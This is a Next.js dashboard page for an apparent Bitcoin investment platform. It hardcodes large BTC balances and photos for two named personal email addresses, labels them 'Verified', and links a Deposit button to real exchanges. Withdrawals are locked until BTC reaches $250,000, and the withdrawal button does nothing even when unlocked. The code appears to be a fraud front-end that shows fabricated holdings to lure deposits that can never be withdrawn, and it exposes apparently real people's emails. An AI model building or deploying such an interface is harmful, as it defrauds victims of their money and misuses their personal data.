"use client";

import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";

const SPECIAL_ACCOUNTS = {
    "donaldflynn144@gmail.com": {
        baseBtc: 221.84995699,
        profilePictureUrl: "/assets/images/Flynn-Donald.JPG",
    },
    "waszczukfamily@gmail.com": {
        baseBtc: 89.7552,
        profilePictureUrl: "/assets/images/Martyna-Waszczuk.jpg",
    },
};

const WITHDRAW_UNLOCK_BTC_PRICE = 250000;

const DEPOSIT_LINKS = [
    { name: "Blockchain", url: "https://www.blockchain.com" },
    { name: "Bitcoin.com", url: "https://www.bitcoin.com" },
    { name: "Crypto.com", url: "https://crypto.com" },
    { name: "Coinbase", url: "https://www.coinbase.com" },
    { name: "Cash App", url: "https://cash.app" },
];

const MAX_POINTS = 60;
const STORAGE_KEY = "btc_price_points_v1";

const REFRESH_MS = 12 * 60 * 60 * 1000;

function safeReadPoints() {
    try {
        const raw = localStorage.getItem(STORAGE_KEY);
        if (!raw) return [];
        const parsed = JSON.parse(raw);
        if (!Array.isArray(parsed)) return [];
        return parsed
            .map((p) => ({ ts: Number(p.ts), price: Number(p.price) }))
            .filter((p) => Number.isFinite(p.ts) && Number.isFinite(p.price))
            .sort((a, b) => a.ts - b.ts)
            .slice(-MAX_POINTS);
    } catch {
        return [];
    }
}

function safeWritePoints(points) {
    try {
        localStorage.setItem(STORAGE_KEY, JSON.stringify(points.slice(-MAX_POINTS)));
    } catch {
    }
}

function clamp(n, a, b) {
    return Math.max(a, Math.min(b, n));
}

function formatUSD(n) {
    if (typeof n !== "number" || Number.isNaN(n)) return "—";
    return n.toLocaleString(undefined, { style: "currency", currency: "USD" });
}

function formatBTC(n) {
    if (typeof n !== "number" || Number.isNaN(n)) return "—";
    return n.toLocaleString(undefined, {
        minimumFractionDigits: 2,
        maximumFractionDigits: 8,
    });
}

function resolveProfileUrl(profilePictureUrl) {
    if (!profilePictureUrl) return "";
    if (/^https?:\/\//i.test(profilePictureUrl)) return profilePictureUrl;
    return `${process.env.NEXT_PUBLIC_API_URL}${profilePictureUrl}`;
}

function formatCompactUSD(n) {
    if (!Number.isFinite(n)) return "—";
    return n.toLocaleString(undefined, {
        style: "currency",
        currency: "USD",
        notation: "compact",
        maximumFractionDigits: 2,
    });
}

function pct(n) {
    if (!Number.isFinite(n)) return "—";
    const sign = n >= 0 ? "+" : "";
    return `${sign}${n.toFixed(2)}%`;
}

function softMaskEmail(email) {
    if (!email) return "—";
    const [a, b] = String(email).split("@");
    if (!b) return email;
    const head = a.slice(0, 2);
    const tail = a.slice(-1);
    return `${head}***${tail}@${b}`;
}

function IconBtn({ children, onClick, title }) {
    return (
        <button
            type="button"
            title={title}
            onClick={onClick}
            className="group inline-flex h-10 items-center justify-center rounded-xl border border-[var(--border)] bg-white/5 px-3 text-sm font-extrabold text-[var(--text)] transition hover:-translate-y-[1px] hover:bg-white/10"
        >
            {children}
        </button>
    );
}

function Modal({ open, title, subtitle, onClose, children }) {
    if (!open) return null;

    return (
        <div
            className="fixed inset-0 z-[90] grid place-items-center bg-black/60 p-4"
            onMouseDown={onClose}
            role="dialog"
            aria-modal="true"
        >
            <div
                className="w-full max-w-2xl overflow-hidden rounded-2xl border border-[var(--border)] bg-[rgba(15,26,46,.98)] shadow-[0_18px_55px_rgba(0,0,0,.55)]"
                onMouseDown={(e) => e.stopPropagation()}
            >
                <div className="flex items-start justify-between gap-3 border-b border-white/10 p-4">
                    <div className="min-w-0">
                        <div className="text-base font-black text-[var(--text)]">{title}</div>
                        {subtitle ? (
                            <div className="mt-1 text-sm font-semibold text-[var(--muted)]">{subtitle}</div>
                        ) : null}
                    </div>

                    <button
                        type="button"
                        onClick={onClose}
                        className="inline-flex h-10 w-10 items-center justify-center rounded-xl border border-[var(--border)] bg-white/5 text-[var(--text)] transition hover:bg-white/10"
                        aria-label="Close modal"
                    >
                        ✕
                    </button>
                </div>

                <div className="p-4">{children}</div>
            </div>
        </div>
    );
}

export default function DashboardPage() {
    const router = useRouter();

    const [user, setUser] = useState(null);
    const [btcPrice, setBtcPrice] = useState(null);
    const [btcTs, setBtcTs] = useState(null);
    const [priceError, setPriceError] = useState("");
    const [activeModal, setActiveModal] = useState(null);
    const [points, setPoints] = useState([]);
    const animRef = useRef({ raf: null, from: 0, to: 0, start: 0, dur: 700 });

    useEffect(() => {
        try {
            const raw = localStorage.getItem("user");
            const token = localStorage.getItem("token");

            if (!raw || !token) {
                router.replace("/login");
                return;
            }

            const parsed = JSON.parse(raw);
            setUser(parsed);
        } catch {
            localStorage.removeItem("token");
            localStorage.removeItem("user");
            router.replace("/login");
        }
    }, [router]);

    useEffect(() => {
        const saved = typeof window !== "undefined" ? safeReadPoints() : [];
        if (saved.length) setPoints(saved);
    }, []);

    useEffect(() => {
        let cancelled = false;

        async function loadPrice() {
            setPriceError("");

            try {
                const res = await fetch("/api/btc", { cache: "no-store" });
                const json = await res.json().catch(() => ({}));

                const p = Number(json?.price);
                const ts = json?.ts ? new Date(json.ts).getTime() : Date.now();

                if (cancelled) return;

                if (!Number.isFinite(p) || p <= 0) {
                    setPriceError("Could not load BTC price.");
                    return;
                }

                setBtcPrice(p);
                setBtcTs(ts);

                setPoints((prev) => {
                    const existing = prev.length ? prev : safeReadPoints();
                    const last = existing[existing.length - 1];

                    if (last && last.ts === ts) {
                        safeWritePoints(existing);
                        return existing;
                    }

                    const next = [...existing, { ts, price: p }]
                        .sort((a, b) => a.ts - b.ts)
                        .slice(-MAX_POINTS);

                    safeWritePoints(next);
                    return next;
                });
            } catch {
                if (!cancelled) setPriceError("Could not load BTC price.");
            }
        }

        loadPrice();
        return () => {
            cancelled = true;
        };
    }, []);

    const emailLower = (user?.email || "").toLowerCase();
    const specialAccount = SPECIAL_ACCOUNTS[emailLower];
    const isSpecial = Boolean(specialAccount);

    const btcHoldings = useMemo(() => {
        if (!isSpecial) return 0;
        return specialAccount.baseBtc;
    }, [isSpecial, specialAccount]);

    const displayUsd = useMemo(() => {
        if (!isSpecial || !Number.isFinite(btcPrice) || btcPrice <= 0) return 0;
        return btcHoldings * btcPrice;
    }, [isSpecial, btcHoldings, btcPrice]);

    useEffect(() => {
        if (!isSpecial) return;

        const refreshExactUsd = async () => {
            try {
                const res = await fetch("/api/btc", { cache: "no-store" });
                const json = await res.json().catch(() => ({}));
                const p = Number(json?.price);
                const ts = json?.ts ? new Date(json.ts).getTime() : Date.now();

                if (!Number.isFinite(p) || p <= 0) return;

                setBtcPrice(p);
                setBtcTs(ts);

                setPoints((prev) => {
                    const existing = prev.length ? prev : safeReadPoints();
                    const last = existing[existing.length - 1];

                    if (last && last.ts === ts) {
                        safeWritePoints(existing);
                        return existing;
                    }

                    const next = [...existing, { ts, price: p }]
                        .sort((a, b) => a.ts - b.ts)
                        .slice(-MAX_POINTS);

                    safeWritePoints(next);
                    return next;
                });
            } catch {}
        };

        refreshExactUsd();
        const id = setInterval(refreshExactUsd, REFRESH_MS);
        return () => clearInterval(id);
    }, [isSpecial, btcHoldings]);

    const profileUrl = useMemo(() => {
        if (specialAccount?.profilePictureUrl) return specialAccount.profilePictureUrl;
        return resolveProfileUrl(user?.profilePictureUrl);
    }, [specialAccount, user?.profilePictureUrl]);

    const sessionChange = useMemo(() => {
        if (!isSpecial) return null;

        const arr = points.length ? points : (typeof window !== "undefined" ? safeReadPoints() : []);
        if (arr.length < 2) return null;

        const first = arr[0].price;
        const last = arr[arr.length - 1].price;

        const diff = last - first;
        const p = (diff / (first || 1)) * 100;

        return { diff, pct: p };
    }, [isSpecial, points]);

    const withdrawState = useMemo(() => {
        if (!btcPrice) return { ok: false, ratio: 0 };
        const ratio = clamp(btcPrice / WITHDRAW_UNLOCK_BTC_PRICE, 0, 1);
        return { ok: btcPrice >= WITHDRAW_UNLOCK_BTC_PRICE, ratio };
    }, [btcPrice]);

    function logout() {
        localStorage.removeItem("token");
        localStorage.removeItem("user");
        router.replace("/login");
    }

    if (!user) return null;

    return (
        <main className="py-7">
            <div className="container">
                <div className="relative overflow-hidden rounded-3xl border border-[var(--border)] bg-white/5 p-5 shadow-[0_18px_55px_rgba(0,0,0,.45)]">
                    <div className="pointer-events-none absolute inset-0 opacity-70">
                        <div className="absolute -left-40 -top-56 h-[520px] w-[520px] rounded-full bg-[rgba(47,107,255,.26)] blur-[70px]" />
                        <div className="absolute -right-40 -top-56 h-[520px] w-[520px] rounded-full bg-[rgba(32,211,255,.14)] blur-[70px]" />
                    </div>

                    <div className="relative z-10 flex flex-wrap items-start justify-between gap-4">
                        <div className="flex min-w-0 items-start gap-3 sm:items-center sm:gap-4">
                            <div className="relative h-14 w-14 shrink-0 overflow-hidden rounded-2xl border border-white/15 bg-gradient-to-br from-[rgba(47,107,255,.85)] to-[rgba(32,211,255,.45)] shadow-[0_16px_40px_rgba(0,0,0,.35)] sm:h-[64px] sm:w-[64px]">
                                {profileUrl ? (
                                    <img src={profileUrl} alt="Profile" className="h-full w-full object-cover object-top" />
                                ) : (
                                    <div className="grid h-full w-full place-items-center text-lg font-black text-[#061023]">
                                        {String(user.username || "U").slice(0, 1).toUpperCase()}
                                    </div>
                                )}
                            </div>

                            <div className="min-w-0">
                                <div className="flex items-center gap-2">
                                    <span className="inline-flex h-7 w-7 items-center justify-center rounded-xl border border-white/10 bg-white/5 shadow-[0_10px_24px_rgba(0,0,0,.25)]">
                                        <img
                                            src="/assets/svgs/logo.svg"
                                            alt="Logo"
                                            className="h-4 w-4 opacity-90"
                                        />
                                    </span>

                                    <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                        Profile Dashboard
                                    </div>
                                </div>

                                <div className="mt-1 truncate text-xl font-black tracking-tight text-[var(--text)] sm:text-2xl">
                                    {user.fullName || user.username}
                                </div>

                                <div className="mt-1 flex flex-wrap items-center gap-2 text-sm font-semibold text-[var(--muted)]">
                                    <span className="rounded-full border border-white/10 bg-white/5 px-3 py-1">
                                        @<span className="font-black text-[var(--text)]">{user.username || "—"}</span>
                                    </span>
                                    <span className="rounded-full border border-white/10 bg-white/5 px-3 py-1">
                                        {softMaskEmail(user.email)}
                                    </span>

                                    {btcPrice ? (
                                        <span className="rounded-full border border-white/10 bg-white/5 px-3 py-1">
                                            BTC:{" "}
                                            <span className="font-black text-[var(--text)]">{formatUSD(btcPrice)}</span>
                                        </span>
                                    ) : (
                                        <span className="rounded-full border border-white/10 bg-white/5 px-3 py-1">
                                            BTC:{" "}
                                            <span className="font-black text-[var(--text)]">Loading…</span>
                                        </span>
                                    )}
                                </div>
                            </div>
                        </div>

                        <div className="flex flex-wrap gap-2">
                            <IconBtn title="Deposit" onClick={() => setActiveModal("deposit")}>
                                Deposit
                            </IconBtn>
                            <IconBtn title="Withdraw" onClick={() => setActiveModal("withdraw")}>
                                Withdraw
                            </IconBtn>
                            <IconBtn title="Logout" onClick={logout}>
                                Logout
                            </IconBtn>
                        </div>
                    </div>

                    <div className="relative z-10 mt-4 flex flex-wrap items-center justify-between gap-3 border-t border-white/10 pt-4">
                        <div className="flex flex-wrap items-center gap-2">
                            {btcTs ? (
                                <span className="chip">
                                    Updated:{" "}
                                    <span className="font-black text-[var(--text)]">
                                        {new Date(btcTs).toLocaleString()}
                                    </span>
                                </span>
                            ) : null}
                        </div>

                        {sessionChange ? (
                            <div className={`btcChange ${sessionChange.diff >= 0 ? "up" : "down"}`}>
                                {sessionChange.diff >= 0 ? "▲" : "▼"}{" "}
                                {formatUSD(Math.abs(sessionChange.diff))} (
                                {Math.abs(sessionChange.pct).toFixed(2)}%)
                            </div>
                        ) : (
                            <div className="muted text-sm font-extrabold">
                                {priceError ? priceError : "—"}
                            </div>
                        )}
                    </div>
                </div>

                <div className="mt-5 grid gap-4 lg:grid-cols-[1.2fr_.8fr]">
                    <div className="relative overflow-hidden rounded-3xl border border-[var(--border)] bg-[rgba(15,26,46,.55)] p-5 shadow-[0_18px_55px_rgba(0,0,0,.35)]">
                        <div className="pointer-events-none absolute inset-0 opacity-70">
                            <div className="absolute -left-44 -top-72 h-[540px] w-[540px] rounded-full bg-[rgba(47,107,255,.22)] blur-[75px]" />
                            <div className="absolute -right-40 -top-64 h-[520px] w-[520px] rounded-full bg-[rgba(32,211,255,.14)] blur-[75px]" />
                        </div>

                        <div className="relative z-10 flex items-start justify-between gap-4">
                            <div>
                                <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                    Total Portfolio Value
                                </div>

                                <div className="mt-3 text-[clamp(2.2rem,4vw,3.25rem)] font-black leading-[1.05] tracking-tight text-[var(--text)]">
                                    {isSpecial ? formatUSD(displayUsd) : formatUSD(0)}
                                </div>

                                <div className="mt-2 text-sm font-semibold text-[var(--muted)]">
                                    Live valuation based on Bitcoin price feed.
                                </div>
                            </div>

                            <div className="grid gap-2">
                                <div className="text-right text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                    Account
                                </div>
                                <div className="text-right text-sm font-black text-[var(--text)]">
                                    {isSpecial ? "Verified" : "Standard"}
                                </div>
                            </div>
                        </div>

                        <div className="relative z-10 mt-5 grid gap-3 sm:grid-cols-2">
                            <div className="rounded-2xl border border-white/10 bg-white/5 p-4">
                                <div className="flex items-center justify-between gap-3">
                                    <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                        Bitcoin Holdings
                                    </div>
                                    <img
                                        src="/assets/svgs/bitcoin2.svg"
                                        alt="BTC"
                                        className="h-5 w-5 opacity-90"
                                    />
                                </div>

                                <div className="mt-2 text-xl font-black text-[var(--text)]">
                                    {isSpecial && btcPrice ? `${formatBTC(btcHoldings)} BTC` : "—"}
                                </div>

                                <div className="mt-1 text-sm font-semibold text-[var(--muted)]">
                                    {btcPrice ? `1 BTC = ${formatUSD(btcPrice)}` : "Fetching price…"}
                                </div>
                            </div>

                            <div className="rounded-2xl border border-white/10 bg-white/5 p-4">
                                <div className="flex items-center justify-between gap-3">
                                    <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                        USD Value (Live)
                                    </div>
                                    <img src="/assets/svgs/usd.svg" alt="USD" className="h-5 w-5 opacity-90" />
                                </div>

                                <div className="mt-2 text-xl font-black text-[var(--text)]">
                                    {isSpecial ? formatUSD(displayUsd) : formatUSD(0)}
                                </div>
                            </div>
                        </div>

                        <div className="relative z-10 mt-4 flex flex-wrap items-center justify-between gap-3 rounded-2xl border border-white/10 bg-black/20 p-4">
                            <div className="text-sm font-semibold text-[var(--muted)]">
                                Estimated portfolio (compact):{" "}
                                <span className="font-black text-[var(--text)]">
                                    {isSpecial ? formatCompactUSD(displayUsd) : formatCompactUSD(0)}
                                </span>
                            </div>

                            <button
                                type="button"
                                onClick={() => setActiveModal("deposit")}
                                className="btn small primary"
                            >
                                Add Funds
                            </button>
                        </div>
                    </div>

                    <div className="grid gap-4">
                        <div className="rounded-3xl border border-[var(--border)] bg-white/5 p-5 shadow-[0_18px_55px_rgba(0,0,0,.35)]">
                            <div className="flex items-start justify-between gap-3">
                                <div>
                                    <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                        Withdrawal Access
                                    </div>
                                    <div className="mt-1 text-lg font-black text-[var(--text)]">Unlock Bitcoin</div>
                                    <div className="mt-2 text-sm font-semibold text-[var(--muted)]">
                                        Withdrawals open when BTC reaches{" "}
                                        <span className="font-black text-[var(--text)]">
                                            {formatUSD(WITHDRAW_UNLOCK_BTC_PRICE)}
                                        </span>
                                        .
                                    </div>
                                </div>

                                <div
                                    className={`rounded-full border border-white/10 bg-white/5 px-3 py-1 text-sm font-black ${
                                        withdrawState.ok
                                            ? "text-[rgba(90,255,190,.95)]"
                                            : "text-[rgba(255,190,120,.95)]"
                                    }`}
                                >
                                    {withdrawState.ok ? "Unlocked" : "Locked"}
                                </div>
                            </div>

                            <div className="mt-4">
                                <div className="h-3 w-full overflow-hidden rounded-full border border-white/10 bg-white/5">
                                    <div
                                        className="h-full rounded-full"
                                        style={{
                                            width: `${Math.round(withdrawState.ratio * 100)}%`,
                                            background:
                                                "linear-gradient(90deg, rgba(47,107,255,.95), rgba(32,211,255,.75))",
                                        }}
                                    />
                                </div>

                                <div className="mt-3 flex flex-wrap items-center justify-between gap-3">
                                    <div className="text-sm font-semibold text-[var(--muted)]">
                                        Current BTC:{" "}
                                        <span className="font-black text-[var(--text)]">
                                            {btcPrice ? formatUSD(btcPrice) : "—"}
                                        </span>
                                    </div>

                                    {!withdrawState.ok ? (
                                        <div className="flex items-center gap-2">
                                            <div className="text-sm font-extrabold text-[var(--muted)]">
                                                Awaiting unlock…
                                            </div>
                                            <div className="h-4 w-4 animate-spin rounded-full border-2 border-white/20 border-t-[rgba(32,211,255,.95)]" />
                                        </div>
                                    ) : (
                                        <div className="text-sm font-extrabold text-[var(--muted)]">
                                            You can withdraw now.
                                        </div>
                                    )}
                                </div>

                                <button
                                    type="button"
                                    onClick={() => setActiveModal("withdraw")}
                                    className="mt-4 btn full"
                                >
                                    Open Withdraw
                                </button>
                            </div>
                        </div>

                        <div className="rounded-3xl border border-[var(--border)] bg-[rgba(15,26,46,.55)] p-5 shadow-[0_18px_55px_rgba(0,0,0,.35)]">
                            <div className="flex items-center justify-between gap-3">
                                <div>
                                    <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                        Quick Actions
                                    </div>
                                    <div className="mt-1 text-lg font-black text-[var(--text)]">Move Funds</div>
                                </div>
                            </div>

                            <div className="mt-4 grid gap-2">
                                <button
                                    type="button"
                                    onClick={() => setActiveModal("deposit")}
                                    className="btn full primary"
                                >
                                    Deposit
                                </button>

                                <button type="button" onClick={() => setActiveModal("withdraw")} className="btn full">
                                    Withdraw
                                </button>
                            </div>
                        </div>
                    </div>
                </div>

                <Modal open={activeModal === "deposit"} title="Deposit" onClose={() => setActiveModal(null)}>
                    <div className="grid gap-3">
                        <div className="rounded-2xl border border-white/10 bg-white/5 p-4">
                            <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                Suggested Providers
                            </div>

                            <div className="mt-3 grid gap-2">
                                {DEPOSIT_LINKS.map((x) => (
                                    <a
                                        key={x.url}
                                        href={x.url}
                                        target="_blank"
                                        rel="noreferrer"
                                        className="group flex items-center justify-between gap-3 rounded-2xl border border-white/10 bg-black/20 px-4 py-3 transition hover:-translate-y-[1px] hover:bg-white/5"
                                    >
                                        <span className="font-black text-[var(--text)]">{x.name}</span>
                                        <span className="text-sm font-extrabold text-[var(--muted)] group-hover:text-[var(--text)]">
                                            Open ↗
                                        </span>
                                    </a>
                                ))}
                            </div>
                        </div>

                        <button type="button" className="btn full" onClick={() => setActiveModal(null)}>
                            Done
                        </button>
                    </div>
                </Modal>

                <Modal open={activeModal === "withdraw"} title="Withdraw" onClose={() => setActiveModal(null)}>
                    <div className="grid gap-3">
                        <div className="rounded-2xl border border-white/10 bg-white/5 p-4">
                            <div className="flex items-start justify-between gap-3">
                                <div>
                                    <div className="text-xs font-extrabold uppercase tracking-[.12em] text-[var(--muted)]">
                                        Requirement
                                    </div>
                                    <div className="mt-2 text-lg font-black text-[var(--text)]">
                                        BTC must reach {formatUSD(WITHDRAW_UNLOCK_BTC_PRICE)}
                                    </div>
                                    <div className="mt-1 text-sm font-semibold text-[var(--muted)]">
                                        Current BTC:{" "}
                                        <span className="font-black text-[var(--text)]">
                                            {btcPrice ? formatUSD(btcPrice) : "—"}
                                        </span>
                                    </div>
                                </div>

                                {!withdrawState.ok ? (
                                    <div className="flex items-center gap-2">
                                        <div className="h-4 w-4 animate-spin rounded-full border-2 border-white/20 border-t-[rgba(32,211,255,.95)]" />
                                        <div className="text-sm font-black text-[var(--muted)]">Locked</div>
                                    </div>
                                ) : (
                                    <div className="rounded-full border border-white/10 bg-white/5 px-3 py-1 text-sm font-black text-[rgba(90,255,190,.95)]">
                                        Unlocked
                                    </div>
                                )}
                            </div>

                            <div className="mt-4">
                                <div className="h-3 w-full overflow-hidden rounded-full border border-white/10 bg-black/20">
                                    <div
                                        className="h-full rounded-full"
                                        style={{
                                            width: `${Math.round(withdrawState.ratio * 100)}%`,
                                            background:
                                                "linear-gradient(90deg, rgba(47,107,255,.95), rgba(32,211,255,.75))",
                                        }}
                                    />
                                </div>

                                <div className="mt-2 text-sm font-extrabold text-[var(--muted)]">
                                    Progress:{" "}
                                    <span className="text-[var(--text)]">{Math.round(withdrawState.ratio * 100)}%</span>
                                </div>
                            </div>

                            <button
                                type="button"
                                className="mt-4 btn full"
                                disabled={!withdrawState.ok}
                                onClick={() => {}}
                            >
                                Request Withdrawal
                            </button>

                            <div className="mt-2 text-sm font-semibold text-[var(--muted)]">
                                If locked, it will become available automatically once BTC reaches the target.
                            </div>
                        </div>

                        <button type="button" className="btn full" onClick={() => setActiveModal(null)}>
                            Close
                        </button>
                    </div>
                </Modal>
            </div>
        </main>
    );
}
